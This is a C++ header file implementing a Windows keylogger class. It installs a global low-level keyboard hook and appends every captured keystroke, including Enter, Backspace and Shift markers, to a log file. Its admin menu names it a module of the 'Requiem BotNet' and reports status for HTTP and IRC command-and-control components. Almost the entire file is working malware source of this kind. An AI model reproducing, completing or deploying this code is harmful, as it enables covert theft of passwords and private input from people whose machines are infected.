//Original inspiration: http://newhax.com/forum/index.php?threads/basic-lowlevel-keyboard-hook-example.918/
#ifndef KEYLOG_H
#define KEYLOG_H

class rqKEYLOG {
public: 

	rqKEYLOG(){};

	int start(){
		HINSTANCE appInstance = GetModuleHandle(NULL);//App Instance for call back

		SetWindowsHookEx(WH_KEYBOARD_LL, processKB, appInstance, 0);

		MSG msg; //message recieved
		while (GetMessage(&msg, NULL, 0, 0) > 0) {

			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		return EXIT_SUCCESS;
	}

	static LRESULT CALLBACK processKB(int code, WPARAM event, LPARAM kb) {
		KBDLLHOOKSTRUCT* keyBoard = (KBDLLHOOKSTRUCT*)kb;//ptr to keyboard hook(struct)
		switch (event) {
		case WM_KEYDOWN:
			process(keyBoard->vkCode);

			break;
		}
		return CallNextHookEx(NULL, code, event, kb);
	}

	static void process(int num) { //TODO:: find when shift is being held down for capital letters
		std::fstream fName;
		fName.open(keylogDir, std::ios::app);
		std::cout << num << std::endl;
		if (!fName) {
			std::cout << "fuck no keylog file" << std::endl;
		}

		if (num == 13 || num == VK_RETURN) { //ENTER
			char buffer[] = "{ENTER}";
			fName << std::endl;
			fName.write(buffer, sizeof(buffer)-1);
			fName << std::endl;
		}
		else if (num == 8 || num == VK_BACK) { //BACKSPACE
			char buffer[] = "{<BCKSPC>}";
			fName.write(buffer, sizeof(buffer) - 1);
		}
		else if (num == 162 || num == VK_CONTROL) {
			adminMenu();
		}
		else if (num == 160 || num == VK_SHIFT) {
			char buffer[] = "{<SHIFT>}";
			fName.write(buffer, sizeof(buffer) - 1);
		}
		else {
			char result;
			result = toascii(num);

			fName << result;
		}
	}

	static void adminMenu() {
		std::cout << "----------------" << std::endl;
		std::cout << "|Requiem BotNet|" << std::endl;
		std::cout << "----------------" << std::endl;
		std::cout << "Modules" << std::endl;
		std::cout << "-------" << std::endl;
		std::cout << "Keylogger: ON" << std::endl;
		#ifdef RQHTTP_H
			std::cout << "HTTP C&C: ON" << std::endl;
		#endif
		#ifndef RQHTTP_H
			std::cout << "HTTP C&C: OFF" << std::endl;
		#endif
		#ifdef RQIRC_H
			std::cout << "IRC C&C: ON" << std::endl;
		#endif
		#ifndef RQIRC_H
			std::cout << "IRC C&C: OFF" << std::endl;
		#endif
	}
};
#endif